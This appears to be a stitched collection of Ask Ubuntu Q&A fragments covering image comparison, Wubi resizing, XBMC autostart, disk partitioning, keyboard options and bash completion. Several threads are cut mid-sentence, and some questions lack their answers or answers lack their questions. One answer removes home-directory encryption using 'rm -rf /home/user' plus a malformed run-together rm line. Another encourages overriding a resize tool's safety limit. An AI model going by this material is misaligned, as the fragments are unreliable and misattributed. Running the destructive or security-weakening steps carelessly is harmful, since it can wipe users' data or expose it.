100% the same image) I would also be interested in it, but I am looking for one that gives me visual hints where differences are.)\n\nA: Yes, such a program exists!\nImageMagick has the compare utility, which has several ways of comparing images.\nTo install it:\nsudo apt-get install imagemagick imagemagick-doc\n\nComparing two images visually:\ncompare -compose src tux_orig.png tux_modified.png tux_difference.png\n\ntux_orig.png & tux_modified.png\n\n\nGives this image:\n\nComparing two images via metrics:\nThere are also many ways to output the differences via some metrics, e.g.:\n# compare -verbose -metric PSNR tux_orig.png tux_modified.png tux_difference.png\ntux_orig.png PNG 200x232 200x232+0+0 8-bit sRGB 20.6KB 0.000u 0:00.000\ntux_modified.png PNG 200x232 200x232+0+0 8-bit sRGB 22.2KB 0.010u 0:00.000\nImage: tux_orig.png\n  Channel distortion: PSNR\n    red: 19.5485\n    green: 19.5973\n    blue: 19.6507\n    alpha: 16.1568\n    all: 18.4517\ntux_orig.png=>tux_difference.png PNG 200x232 200x232+0+0 8-bit sRGB 12.3KB 0.030u 0:00.020\n\nSome metric options:\nAE     absolute error count, number of different pixels (-fuzz effected)\nFUZZ   mean color distance\nMAE    mean absolute error (normalized), average channel error distance\nMEPP   mean error per pixel (normalized mean error, normalized peak error)\nMSE    mean error squared, average of the channel error squared\nNCC    normalized cross correlation\nPAE    peak absolute (normalize peak absolute)\nPSNR   peak signal to noise ratio\nRMSE   root mean squared (normalized root mean squared)\n\nThere are many ways to compare images, see ImageMagicks section on compare for further methods.\n\nA: *\n\n*There is command idiff in package openimageio-tools (homepage).\n\n*There is command perceptualdiff in package perceptualdiff (homepage).\n\n*There is command uprightdiff in package uprightdiff (homepage).\n\n\nA: This question was ask back in 2012, and it's 2017.  We now have the non-open-source program Beyond Compare to compare images, and it integrates into Nautilus.  We have also had Geeqie all along for finding similar images throughout a directory structure (recursively).\nI. Finding Image Differences With Beyond Compare\nClick this link to download Beyond Compare .deb packages.\nInstall the package by going to the directory you downloaded the package too, and typing:  sudo dpkg -i YourPackageName.deb which at this moment is called bcompare-4.2.2.22384_amd64.deb, so you would type: sudo dpkg -i bcompare-4.2.2.22384_amd64.deb\nTo complete the install and get the plugin to work in Nautilus, you will need to log out, and then back in, because Nautilus is running in the background even if you don't have it open.\nOnce it is installed and the plugin is working properly, you:\n\n*\n\n*Open Nautilus, and browse to the first image\n\n\n*Right-click the first image to bring up the context menu, and select Select Left File for Compare/Merge\n\n\n*Browse to the second image\n\n\n*Right-click the second image, and select Compare to 'NameOfFirstImageFile' where NameOfFirstImageFile is the name of the file you selected in step 2.\n\n\n*The images will then open up in Beyond Compare, and it will look something like this:\n\nII. Finding Similar/Duplicate Images With Geeqie\n\n*\n\n*Install Geeqie by tying this into a terminal:  sudo apt install geeqie\n\n\n*Open Geeqie, and browse to the directory you want to scan.\n\n\n*Right-click the name of the directory you want to scan and select  Find duplicates... to just scan that directory, or select Find duplicates recursive... to scan that directory and all directories under it.\n\n\n\n*Using the Compare by drop-down list in the lower left corner, you can choose to find duplicates by Checksum, by Filename, or by Similarity levels.  The similarity feature is awesome if you have cropped, rotated, or resized images, you no longer need, as many of us acquire, when we crop/resize pictures to post on social media and such.\n\nA: I ended up with the following:\n~/.gitconfig\nAppend\n[diff \"image\"]\n    command = simple-imagediff\n\nsimple-imagediff\nI've added the following to ~/.local/bin/simple-imagediff:\n#!/usr/bin/env python\n\n# Simple Image Diffs\n# ==================\n#\n# How to Install\n# --------------\n#\n# Download the script somewhere on $PATH as 'simple-imagediff' with +x:\n#\n# $ cd ~/bin\n# $ wget -O simple-imagediff https://raw.github.com/gist/1716699/simple-imagediff.py\n# $ chmod +x simple-imagediff\n#\n# Prerequisites\n# -------------\n#\n# The script should work out-of-the box on Ubuntu 11.10.

After i installed few applications,i get and error saying no enough free space left. \nCan someone help me in finding out how to increase the memory without re-installing/ losing the data.\nThanks in advance.\n\nA: First download the attached file wubi-resize-1.6.tar.gz to your Downloads directory, right-click and choose \"Extract here\". The rest of the resize is run from the Terminal (press Ctrl+Alt+T to open). \ncd ~/Downloads/wubi-resize-1.6\n\nbash wubi-resize.sh --help\n\nsudo bash wubi-resize.sh <your desired space in GB>\n\nThis will resize wubi as per you want.\n\nA: In case it tells you that you cannot increase the size more than 32 GB:\n$ sudo bash wubi-resize_1.5b.sh 80\nwubi-resize_1.5b.sh: The new disk cannot exceed 32 GB unless the\nwubi-resize_1.5b.sh: --max-override option is used (not recommended).\n\nFeel free to run it with --max-override option. I increased my root disk file to 100GB from 30GB. It worked perfectly. wubi-resize makes a new root disk (new.dsk) copies all the files in it from current root disk to it and then asks you to go to windows and rename root.dsk to OLDroot.dsk and new.dsk to root.dsk and restart. This way your old root disk remains saved until you are satisfied that new is working fine and you can delete the old one then. This process does take long though, I ran sudo bash wubi-resize_1.5b.sh --max-override 100 overnight and it was done when I woke up in the morning, so don't know the exact time. \n", "Q: problem in software updater \nPossible Duplicate:\nHow can I fix a 404 Error using a PPA? \n\nI got error in update-manager\n\nW:Failed to fetch\n  http://archive.canonical.com/commercial-ppa-uploaders/skype/ubuntu/dists/quantal/main/binary-i386/Packages\n  404  Not Found [IP: 91.189.92.150 80] , E:Some index files failed to\n  download.

Some offer clear and obvious options in their boot screens (usually selected by pressing F8, F10, F12, or some other key at boot time), but others provide few or no options to control the boot mode, which means you can only control this detail by preparing a boot medium that lacks the boot loader for the mode you don't want to use.\nAs a side note for Geezanansa (and anybody else who may be interested), rEFInd 0.4.6 and later supports booting both EFI-mode and BIOS-mode OSes if your firmware provides appropriate support. The BIOS-mode boot options are disabled by default on UEFI-based PCs (but enabled on Macs), so to use this feature you must edit the scanfor line in refind.conf to scan for BIOS-mode boot options. This feature is still a little klunky, but I've used it to switch between EFI-mode and BIOS-mode boots of Linux. It could be a quick fix if you accidentally install Windows in EFI mode and Linux in BIOS mode -- install rEFInd from Windows and then when you boot, you should see a boot menu giving you both Windows and a generic BIOS-mode boot options. The first will start Windows and the second will launch GRUB 2, which in turn will launch Linux.\n\nA: On your system, switching to UEFI mode will not bring improvement.\nHowever, if you still want UEFI, you will have to use Ubuntu 64bit, and follow  https://help.ubuntu.com/community/UEFI \n", "Q: How can I fix broken sudo - sudo: parse error in /etc/sudoers near line 23?

Most recent video cards have more than one output port, usually VGA and DVI/HDMI. It's not uncommon for the correct output to be chosen during the boot process, then the operating system to use the wrong one. \nYou'll need to hook a monitor up to that other port to get the video long enough to change your graphics card settings. Most monitors will have both an HDMI/DVI and a VGA input, and will often come with a VGA cable, so you shouldn't need a second monitor. However, if it doesn't, and if you have a flat screen TV, you may be able to use your TV for a monitor.

I want to install 12.10 in a USB 2.0 pen drive. I just want to know which brand will be more reliable? I want to use it for long time purpose. I also want good reading and writing speed from the drive and onto the drive. \n\nA: I do not believe that this is an issue anymore. To quote wikipedia on this \n\nAs of 2011, newer flash memory designs have much higher estimated lifetimes. Several manufacturers are now offering warranties of 5 years or more. Such warranties should make the device more attractive for more applications. By reducing the probability of the device's premature failure, flash memory devices can now be considered for use where a magnetic disk would normally have been required. Flash drives have also experienced an exponential growth in their storage capacity over time (following the Moore's Law growth curve). As of 2011, single packaged devices with capacities of 64GB are readily available, and devices with 8 GB capacity are very economical. Storage capacities in this range have traditionally been considered to offer adequate space, because they allow enough space for both the operating system software and some free space for the user's data.\n\nJust go for a common brand like Verbatim, Corsair, Kingston, Sandisk. They probably get those made in the same factory anyways. All of them will get you at least a few years from the pen drive. Long enough for you to get a new one (with alot more capacity) anyways. \n\nRegarding the second part: speed. There is a very long list of USB drives here but do not expect USB 2.0 to be fast. I myself have a corsair gt, patriot quad channel, jetflash 330. None of these 3 are slow. \n", "Q: Unstable after moving headless server from usb-hdd to usb pendrive Ubuntu server 12.04.1 running from usb-hdd is rock solid for months.

Willing to buy a usb pendrive that is known to work. Recommendations?\n\nA: Your pendrive is just flaky.  I don't have a specific recommendation for brand, aside from \"spend a little more\" and specifically look for one advertising fast USB2.0 or (better) USB3.0 access.  You generally get what you pay for, and cheap pendrives aren't really designed or tested for long-term connection with heavy usage.\n", "Q: Set default JDK version on Launchpad packaging system Hello there for my application I need to set the default JDK for building my packages.

So it will be visible to every application.\nUPDATE: I do have openjdk-7-jdk installed and openjdk-7-jre installed but the problem is that for some reason it defaults to openjdk-6 (which I didn't install)\n\nA: But are you sure you have OpenJDK installed. Do not forget that there are 2 different packages. JRE which is the java runtime environment. This will allow you to run java applications, but not compile. In order to compile, you will need to install the JDK, java development kit. In ubuntu there is openjdk-7-jdk and openjdk-7-jre.

How to change the decimal comma ',' to decimal period '.' in the numeric pad of the keyboard?\nI have used xmodmap but every time that I change my keyboard layout the changes (by xmodmap) are being reset.\n\nA: I think the problem is that you are mixing xmodmap commands with setxkbmap commands (whether on the command-line or by using the graphical settings menus). As you have observed, the setxkbmap commands will override the xmodmap commands when you change your keyboard layout. The logical solution would therefore be to use setxkbmap to change both your layout and the keypad comma to a decimal period.\nWhen you use setxkbmap to change your layout any specified customisations will also be applied: the full list of options is available at /usr/share/X11/xkb/rules/evdev.lst. I don't know which language layouts you use, so I have placed just two examples at the end of the following command, which you can use to switch layouts with ALt+Shift. If you have any more key mappings or bindings you want to activate, simply add them to the command:\nsetxkbmap -option '' -option kpdl:dot -option grp:switch,grp:alt_shift_toggle gb,nl\n\nThe first command switch (-option '') clears any current settings, as when new settings are given they are added to and do not replace any existing ones unless this option is used. The second (-option kpdl:dot) makes sure that the appropriate keypad key is a dot or period; the third command switch (-option grp:switch,grp:alt_shift_toggle) sets up your ability to switch the layouts with ALt+Shift, and the last (gb,nl) specifies the layouts to switch to.\nTo check your settings, you can enter\nsetxkbmap -query\n\nwhich results in:\nrules:      evdev\nmodel:      pc105\nlayout:     gb,nl\noptions:    kpdl:dot,grp:switch,grp:alt_shift_toggle\n\nAdd the full setxkbmap line further above as a startup item to make sure it is activated and available for you to use.\nMore information on setxkbmap is available by entering man setxkbmap or by viewing the Ubuntu manpages online.\n\nA: In Ubuntu 14.04 LTS, there are at least two ways to do this.\nAssumptions:\n\n\n*\n\n*You want to do this for Unity (graphical environment).\n\n*The goal is just to change comma to dot, not to change the whole layout or other options.\n\n\n\nOption 1: GUI (dconf-editor)\nRun (Alt+F2) \"dconf-editor\", navigate in the tree to schema \"org.gnome.desktop.input-sources\" and set the key \"xkb-options\" to value that you want, e.g. \"['kpdl:comma']\" or \"['kpdl:dot']\".\nValues are defined in xkeyboard-config help:\nman xkeyboard-config\n\nThis is what I found there:\nNumeric keypad delete key behaviour\n   ┌─────────────────────────────────────────────────────────────────┐\n   │Option               Description                                 │\n   ├─────────────────────────────────────────────────────────────────┤\n   │kpdl:dot             Legacy key with dot                         │\n   │kpdl:comma           Legacy key with comma                       │\n   │kpdl:dotoss          Four-level key with dot                     │\n   │kpdl:dotoss_latin9   Four-level key with dot, Latin-9 only       │\n   │kpdl:commaoss        Four-level key with comma                   │\n   │kpdl:momayyezoss     Four-level key with momayyez                │\n   │kpdl:kposs           Four-level key with abstract separators     │\n   │kpdl:semi            Semicolon on third level                    │\n   └─────────────────────────────────────────────────────────────────┘\n\n\nOption 2: Command line (gsettings)\nYou can also use command line instead of dconf-editor GUI to accomplish the same.

I've been using vpnc to work remotely for one of my major clients and they've recently added the restriction that the connection must be authenticated with a smart card.  I really don't want to have to go back to using Windows to do all my work for them.\n\nA: vpnc is pretty ancient, try openconnect instead.\nhttp://www.infradead.org/openconnect/index.html\nit supports smartcards \n", "Q: Upgrade Issues Ubuntu 12.04 I recently upgraded from 11.10 to 12.04, during the upgrade process the computer was hung up on a process and became what seemed to be unresponsive. After waiting about 9 hours for the process to complete with no success, I just turned off the computer.\nProbably not the best call and what makes matters worse is I did not backup my data. I have made this mistake before however I was able to boot back up and the old OS was still there and user data was preserved. That was a malfunction that ended up benefitting from in the end, but this time not so lucky. I rebooted and just after the BIOS screen the computer sits at a screen that is just a black screen with a single blinking cursor in the top left corner. Nothing can be typed or commanded.\nIs there an OS on the machine anymore?\nIs my User data and home folder still available?\nCould I just insert by ubuntu 10 disc and re-install... or use without installing... to potentially recover any remaining data??\n\nA: The old installation should still be there.

I'm developing websites and I want to preview the ones from localhost on my Nexus7.\n\nA: On your Ubuntu machine, find your local IP address. One way of finding this is by using the ifconfig terminal command, where it is displayed as inet addr under the interface you're currently using to connect to the network. Point the browser on your Nexus 7 to that IP address, and the web page should be displayed.\n", "Q: Difference between programs in Software Centre and Launchpad PPA On several Ubuntu sites such as OMG Ubuntu there are summaries of new ppa's. These are useful programs, but they don't appear in the Software Center.\nHowever, in the center there are programs that specifically say are \"community supported\" and not Canonical supported.\nSo what is the difference between Software Center programs and PPA's?\nIt would be a lot more useful if more PPAs were in the center.\n\nA: I believe you are missing some information about PPA's.\nAfter you install a PPA this PPA -is- included into Ubuntu Software Center. You can see all the available packages for that PPA.  They are included in software sources as shown here:\n\nbut there is also a list of PPA's inside USC (I believe it is under installed).\nBesides that: PPA are generally software that are not supported by Ubuntu itself. If someone that created software wants this to be included into USC as a part of Ubuntu they should and can apply for it to be included. Though most do not care for it since this method seems to work best for everyone.\n\nFor more information see: What are PPAs and how do I use them?\n\nA: firstly PPA is personal package archives.\nIts like an online account for storing packages, etc, that any individual can create and share with other people.\nAn owner of a PPA can upload personally created or modified software.\nSoftware Center programs are more like the Google Play store or the Apple App Store application.\nSoftware there is known to be stable release (not beta) versions.\nBroadly speaking : PPA packages operate on the basis of trust -- you have to ask yourself how trustworthy is the person who owns it.\nAnd software center applications are recognized or approved by Canonical, so they are the most reliable.\n", "Q: Autostart XBMC at boot I'm running Ubuntu 12.10 desktop 64-bit. I've installed the latest version of XBMC (Eden). Everything seems to be working great.\nThe only small issue I'm running into is that I can't figure out how to make XBMC launch automatically on boot/restart. In the 'Startup Applications Preferences' dialog in Ubuntu I have added a new launcher with the command\n/usr/bin/xbmc\n\nand ticked the checkbox next to it. When I restart though XBMC doesn't launch. I know this is the correct path because I ran\nwhich xbmc\n\nin the Terminal to confirm it.\nAm I doing something really stupid here? How come XBMC won't launch automatically? It works fine if I click its icon in the dock.\nMany thanks,\n\nA: Run:\ngedit ~/.config/autostart/xbmc.desktop\n\nwrite in file\n[Desktop Entry]\nType=Application\nExec=xbmc -d 5 --standalone -fs\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_En]=xbmc\nName=xbmc\nComment[en_En]=\nComment=\n\nsave file and restart system.\nXBMC will start with five second delay, in standalone mode and full screen mode.\n\nA: I had a small issue getting it to run automatically too, doing the same thing. My issue was that it would not start full screen, even when passing it the -fs argument. As Bruno Pereira has suggested, using the XBMC session works great. Click the little Ubuntu symbol next to your username when you log in and select XBMC. If you have set your computer to auto-login, you will have to log out to do this. Then when you want to do something on your computer not XBMC related, simply log off, and log back in, changing the session back to Ubuntu.\nThe other option, which may work for you is to create a small script like this:\n#!/bin/bash\n/bin/sleep 5\n/usr/bin/xbmc -fs\n\nSave this somewhere as xbmcstartscript.sh, then use\nchmod +x xbmcstartscript.sh\nto make it executable. Now use that script for your startup application, instead of pointing directly to XBMC.\nApparently there is some sort of conflict/race condition where XBMC will try to start up before Unity is done loading, so you need to wait a few seconds before opening XBMC.\n\nA: A better option is to make XBMC your session. You won't get into unity etc, so it's all a bit cleaner.\n\n\n*\n\n*if you auto-log in, then logout of your current session.\n\n*on the log-in screen, press the ubuntu logo next to your name\n\n*choose 'XBMC'\n\n*log in.\n\n\nThis makes XBMC go all fullscreen when you (auto?) log in.\n\nA: Are you using encrypted home directories? If so, the autologin features, and the scripts above + elsewhere, didn't work for me on 14.04 (one of them created a nasty loop which left me unable to login locally; thankfully I could get terminal access through webmin).\nAnyway, what did work for me was unencrypting the home directories per the instructions here (modified slightly as I found some bits unclear):\n(1) Login to an administrator account.\n(2) Open a terminal window and backup your home directory/ies - you will need to do this for all users on the system, as this process removes encryption for everyone. Change 'user' below to the names of your users.\n\nsudo cp -rp /home/user /home/user.backup\n\n(3) Check there are no errors in the copy process; there shouldn't be, but you are about to delete the original, so worth making sure.\n(4) Delete your home directory/ies:\n\nrm -rf /home/user\n\n(5) Remove the encryption packages\n\nsudo apt-get remove ecryptfs-utils libecryptfs0\n\n(6) Restore your home directory\n\nsudo mv /home/user.backup /home/user\n\n(7) Reboot\nThe original instructions suggested removing any .Private .ecryptfs folders; I didn't have to do this, but you may.\n\nrm -rf ~/.Private rm -rf ~/.ecryptfs\n\n(8) Because I'd already set the user account I wanted to autologin in the system / users panel, when I rebooted it logged straight in.\n(9) If you then open the Dash (click the ubuntu symbol in the top left) and search for \"startup applications\" per the answer above, I had success just calling \"kodi\".\n\nA: You could simply use Ubuntu's Startup Application to start Kodi as standalone. In the name field put the name of the startup such as Kodi. In the command field put \"-d 5 --standalone -fs\". To exit Kodi to Ubuntu Desktop, click on the exit icon in Kodi at the bottom left of the Kodi home screen.\n", "Q: Ubuntu 11.10 does not see all the memory I have 11.10 64bit installed on my Lenovo s205.

This may mean that you have\nrequested an impossible situation or if you are using the unstable\ndistribution that some required packages have not yet been created\nor been moved out of Incoming.\nThe following information may help to resolve the situation:\n\nThe following packages have unmet dependencies.\n linux-generic-pae:i386 : Depends: linux-image-generic-pae:i386 (= 3.0.0.27.31) but it is not going to be installed\n linux-headers-generic-pae:i386 : Depends: linux-headers-3.0.0-27-generic-pae:i386 but it is not going to be installed\nE: Unable to correct problems, you have held broken packages.\n\n\nA: This is likely caused by your computer using main RAM for your graphics card. Based on the amounts reported, I would guess your graphics card is using 384MB specifically.   You can usually check and adjust the allocation in your BIOS config - it can't be adjusted from within Ubuntu. \nHere's a similar question:\nHow to check graphics card details? \n\nA: The PAE kernel is only for enabling 32 bit operating systems to support more than 4GB of memory.\nThat said, there are a few reasons why you don't see the amount you expect to see (ordered from most to least likely).\n\n*\n\n*System Reserved Memory While it's Windows-centric in some parts, this article provides a good description of where your RAM is going, as well as what PAE is. Of specific interest is this:\n\n\nThe original IBM PC’s processor could access 1024 KB of physical\naddress space, but you could only use 640 KB for RAM. The remaining\n384 KB of address space was reserved for memory-mapped hardware and\nROM. A similar situation exists with current systems: hardware\nreserves large chunks of the upper 1 GB of physical address space.\nBecause of these reserved areas, a system with a 32-bit physical\naddress space will be limited to somewhere around 3.1-3.5 GB of RAM.\n\n\n*\n\n*Onboard video If you're using a video card with shared RAM, then it will eat into your system memory, equivalent to whatever it's set to use. In trying to find the specs for your computer, I've found two conflicting spec, one that says 512MiB (and suggests discrete memory), and one that says 384MiB (and integrated/shared) RAM, so it may depend on the build and where you go it, but it's possible that your video card is sharing your RAM. If you have Catalyst installed, it might be able to give you better information on your card.\n\n\n*SI to Binary conversion This is less of a concern with RAM (it's generally more noticeable and more of concern with hard drives due to OEMs' use of the SI definition when advertising amounts), but I think it's worth mentioning, for educational purposes. Simply put, there is a difference between Gigabyte (GB) and Gibibyte (GiB). The \"Giga-\" prefix is the SI unit for 10^9 (10 to the 9th power), while the binary \"Gibi-\" is 2^30 (2 to 30th power). For years, \"Giga\" was used basically for rounding purposes, while we were working in \"kilobytes\" (1KiB = 1024B, which is pretty close to 1000) and abbreviation purposes (KiB became just K, until we moved into larger units, and we just added the \"B\" back on). As such, in the off chance that you were given your memory amount in SI, instead of binary, your 4GB would, in fact, be about 3.7GiB. Since we're talking RAM, and the discrepancy is consistent (always .4GiB), this is highly unlikely, and it's far more likely that it's point 1, and maybe point 2.\n", "Q: Why do some 12.04 PPAs not work in 12.10? After a fresh install of Quantal some of the PPAs from Precise don't work.\nEven with apps such as Lightread that were recently created and from the Precise Software Centre.\nIs there a separate Software Centre for each release?\nDo PPAs work across versions?\n\nA: PPAs must support each version. If the developers haven't set up their repository for 12.10 yet, it won't work. There are not separate Software Centers for each version, but they do use different repositories on the backend.\nThe reason for this is fairly simple.

When I disconnect from eth0 I then regain access.\nI have searched extensively for a solution, and have come up short. Any help is appreciated.\n\nA: Your eth0 interface is probably controlled by NetworkManager, which shuts the connection down once it has something it deems better suited for getting online.\nYou could create a static configuration for eth0 in /etc/network/interfaces.

Our knowledge of UNIX/Linux is very limited. At work the support people just sent me a line by line cook book.\nThe computer is a Gateway MDP e4000 with Mythbuntu installed on a PATA drive and we are adding a SATA drive for the second drive. The BIOS sees the drive.\nI would appreciate any help you can give us.\n\nA: yeah your getting that error because your formatting an extended partition, and you need a primary partition with SATA. If you were setting up an IDE slave device this would work, but you need a partition table with SATA. Extended partitions don't work that way.\nSo, if you want to start over this should work out, its not too complicated but you definitely want to be sure which drive is which. \nI'm guessing you just need one data partition on the spinner, and use the solid for the boot device, so run fdisk -l and be darn sure you know exactly which drive your going to format. \nI am doing this procedure as I write this so I do not miss something, a mistake can, or rather will most likely ruin your system. \nRun \nfdisk -l\n\nchose the drive your going to use. In my case I have a couple other drives, so I'm \nusing Sdc. I think your best to drop into root instead of just sudo, so run\nsudo -s\n\nNow your as root\nNext we need to create a partition, so the new drive has a table so the system can \nfind it. \nroot@xxx #fdisk /dev/sdx\n\nwhere x is your drive letter\nThis will pull up a GUI \nfist we need to create a new partition:\nCommand (m for help): n\n\ne   extended\np   primary partition (1-4)\nWe want a primary, so we use 'p'\np\n\nThis is the only partition on a clean disk\nPartition number (1-4): 1\n\nI just use the defaults for the start and end sector\nThen write the new table and exit with the following\nCommand (m for help): w` \n\nNOTE once in fdisk, if you realize you are in the wrong drive, or make a mistake just \nenter 'q' which quits without writing any of the instructions you have chose. Until \nyou run 'w' nothing changes. \nNow you need to format it as a ext.4 \nroot@xxx# mkfs.ext4 -L disk2 /dev/sdx1\n\nAny errors try unmounting the drive with umount  \nNow the partition is ready we need to make a place to put it, and add an entry to the \nfile that lists the drives when the system boots. \nexit out of root\nexit\n\nsudo blkid\n\n\ndev/sda1: LABEL=\"boot\" UUID=\"some hash\" >TYPE=\"ext2\" PARTUUID=\"string -01\"\n/dev/sda5: UUID=\"some string like above\" TYPE=\"swap\" PARTUUID=\"string - 02\"\n/dev/sda6: LABEL=\"root\" UUID=\"string\" TYPE=\"ext4\" PARTUUID=\"string\"\n/dev/sdc1: LABEL=\"storage\" UUID=\"0BED64E911A2FAD2\" TYPE=\"ext4\" >PARTUUID=\"c07Aab2a-01\"\n\nWe find the drive and partition just wrote, and copy the UUID='string value' and TYPE='ext4', so above example sdc1 is our second hard drive. Copy'UUID=\"0BED64E911A2FAD2\" TYPE=\"ext4\"\"' Get rid of the quotes\nname it something that makes sense in your world`\nsudo mkdir /data0\n\nUse whatever editor you know how to use, if that means none:\nsudo nano /etc/fstab\n\nuse the down arrow key, to scroll to the bottom, and by a new last entry by pasting your clipboard contents. Now use the back arrow, till the cursor is just right of the TYPE= and backspace to erase 'TYPE=', next use the left arrow key to get a couple spaces right from the end of the UUID string. Add the (whatever you named it from mkdir). There should be comments which explain the proper formatting fstab uses, and a few entries, if not you better check that you spelled /etc/fstab correctly. Anyway it should look like this \n\nUUID=some string /               ext4    errors=remount-ro 0       1\n/swapfile                              none    swap   sw         0       0\nUID=0BED64E911A2FAD2 /data0       ext4        defaults      0       2\n\nthen press \nctrl + o\n\nwhen asked are you sure, type \"y\" then press return twice, and then exit with \nctrl + x\n\nFinally finish with\nsudo mount -a\n\nNow your drive will show up. When you reboot it will automatically mount on boot.\nYou do not want to use this to mount removable drives, only use fixed hardware, and\nonly use this method for SATA. \nSorry about my grammar, I barely speak English and hope this can be understood. I also need to be clear this is only for adding a second drive to be used as storage, if you are trying to replace a failed boot drive in which case your probably in read only state there is separate procedure which is outside the scope of the question.\n\nA: Just use Disk Utility or Gparted to format the hard drive as ext4.  If that fails, delete the partitions and the partition tables on the hard drive and start from scratch with Gparted.\nAfter that, all you have to do is put an entry in /etc/fstab so that the drive automounts at boot.\nIt seems that you've made things way more complicated than they need to be.\n\nA: I'm not suggesting that your disk is physically broken but you should definitely confirm that it isn't. Open a terminal and run:\nsudo apt-get install smartmontools\nsudo smartctl -d ata -a /dev/sdb\n\nThis will show you a table with a header (ID# ATTRIBUTE_NAME FLAG, etc.). Find a line with Reallocated_Sector_Ct and make sure that the number under the column RAW_VALUE is 0. If it isn't, that means that the drive is failing and it's time to replace it.\nThen create a single partition (if that's what you want) using fdisk, cfdisk and then create the filesystem on it:\nsudo mkfs.ext4 -L 500GB /dev/sdb1\n\n", "Q: How do I get drivers working for an Nvidia GT560i on 12.04?

The reason I am asking is that I have a script which can be called with start/stop command line arguments. In order to use with if-up.d I have to split the script into 2 parts. Is there a better way to place the script into /etc/network/if-up.d/ without splitting? \n\nA: You could put the real script in one directory, and a symlink to it in the other. Then you could check $0 each time the script gets called, to see which version was invoked. This way you would retain the conveniance to edit the script in one place.\n$0 is the variable, which contains the entire path to the script itself when it gets called. You would find a \"if-up\" or \"if-down\" as part of the path, and this could be interpreted as start and stop.\n", "Q: Dual boot-windows 7 and ubuntu \nPossible Duplicate:\nHow can I install Ubuntu without removing Windows? \n\nI have windows 7 installed on my laptop, i want to install ubuntu 12.10 without losing windows. is it possible that during boot up, it gives me an option to chose how i want to boot after installing both the operating systems\nfor those of you who have tried dual booting\n\nA: That is the default behaviour of Ubuntu 12.10.

And if so what is there a graphic-card I should buy?\nMy Ati is functioning with 3D, on 12.04 I don't understand why it will not upgrade to 12.10.\n\nA: Follow this guide http://www.unixmen.com/ubuntu-12-10-and-amd-catalyst-problem-solved/. It solved my problem with HD 4850 I used the Tomasz Makarewicz Repository\n\nA: As it says here:\nWhat is the correct way to install proprietary ATI Catalyst Video Drivers (fglrx) directly from AMD?\nI have the same problem. Or you downgrade Xorg server version to 1.12, or wait until there is some version of the drivers that support Xorg server version 1.13.\nHope this helps.\nCorrection: I've been told that downgrading to Xorg 1.12 is not an alternative, in this case, because it will break Unity.\n", "Q: Driver video NVIDIA nvidia-173 uninstallable on 12.10 Quantal Quetzal Packages are available from the archive but uninstallable.\nnvidia-173 :\nDepends: xorg-video-abi-11 or xorg-video-abi-12 but it is not installable\nRecommends: nvidia-settings but it is not going to be installed\nE: Unable to correct problems, you have held broken packages.\n\nA: A newer 173 release 173.14.36 seems to support v13 abi.

Downloaded Ubuntu and transferred it to a usb using Unetbootin for mac. My dell mini 9, when I plug the usb in, comes up with 'missing operating system'. Not sure if I missed a step but it appears I have everything on the USB that is needed. Unless I've added something unnecessary like the actual ubuntu 12.10 iso file?\n\nA: Needs to be adjusted for exact BIOS behavior of Dell Mini 9.\nYou may need to change boot order, to select the USB device first (ahead of internal (?) SSD).\n\nA better method is to force manual boot, and select the USB device.  This is usually more reliable.\n\nA: The problem could be one of a couple of things.\nIf there is no operating system on your mini's main drive, the bios might not be booting from the USB stick at all, and instead is trying to boot from the main drive.  This is only the case if you can boot the system normally without the USB stick.  If you have a new empty drive, this is certainly a possibility.  Reading the docs suggests that you can enter the boot menu by pressing 0 repeatedly during the POST screen.\nThe other possibility is that the USB stick is being booted, but there is no MBR on it.  The MBR is invisible to the user for the most part, so its lack of inclusion would not be obvious.  Your best option here is to try making the USB stick again, while reading the instructions again... it is easy to miss that one little detail sometimes.  Also, some USB sticks are strange, so it might be worth trying a different one if you have one handy.  \n", "Q: auto-completion does not work for \"sudo apt-get install\" Okay a college of mine just showed me that you could do\nsudo apt-get install <type first letters of package> <TAB>\n\nThat it auto-completes the name of the package.

Do I have to install a package? My college told me that he didn't install anything extra for it.\n\nA: I had the same problem after installing Ubuntu 15.10.\nReinstalling bash-completion worked for me :\nsudo apt-get install --reinstall bash-completion\n\n\nA: Bash does support some more kinds of autocompletion, not only filename completion.\nIn the file /etc/bash.bashrc, you will find a paragraph, like this or similiar to this:\n\n# enable bash completion in interactive shells\n#if ! shopt -oq posix; then\n#  if [ -f /usr/share/bash-completion/bash_completion ]; then\n#    . /usr/share/bash-completion/bash_completion\n#  elif [ -f /etc/bash_completion ]; then\n#    . /etc/bash_completion\n#  fi\n#fi\n\n(this example is from debian, but is probably identical to the Ubuntu version)\nBy removing the # character in the beginning of each line you put a lot of additional completion rules into effect. (Don't remove the # on the first line... thats really a comment ;-)\nI believe apt-get completions are among those enabled with this. If not you could think about switching to zsh. I know they support it ;-)\n\nA: In Ubuntu it started to irritate me too, so I just did (in terminal):\ngksu gedit /etc/bash.bashrc\n\nand changed\n# enable bash completion in interactive shells\n#if [ -f /etc/bash_completion ] && ! shopt -oq posix; then\n#    . /etc/bash_completion\n#fi\n\ninto\n# enable bash completion in interactive shells\nif [ -f /etc/bash_completion ] && ! shopt -oq posix; then\n    . /etc/bash_completion\nfi\n\nnow it works like I want it to again... HTH :)\nIt is different from the example Paul Hänsch gave, mine came from ubuntu 12.04. I am not sure what Pauls version would do exactly, maybe he could elaborate on that a bit?\n\nA: I found that on mine this was happening because bash-completion was not installed for some reason. So this fixed it (12.04):\nsudo apt-get install bash-completion\n\n\nA: Another issue can be a failed apt-get update. After removing the wrong sources, and running apt-get update, I got my autocomplete restored.\n\nA: Open a Terminal and \nsudo apt-get install bash-completion\n\nAfter I installed bash-completion, this issue is fixed in my side.\n\nA: this happens to me when either:\n\n\n*\n\n*I use my university pc where I can't use the autocomplete because am not a super user.\n\n*The ppa of the package that you are trying to download is not in your source.list.

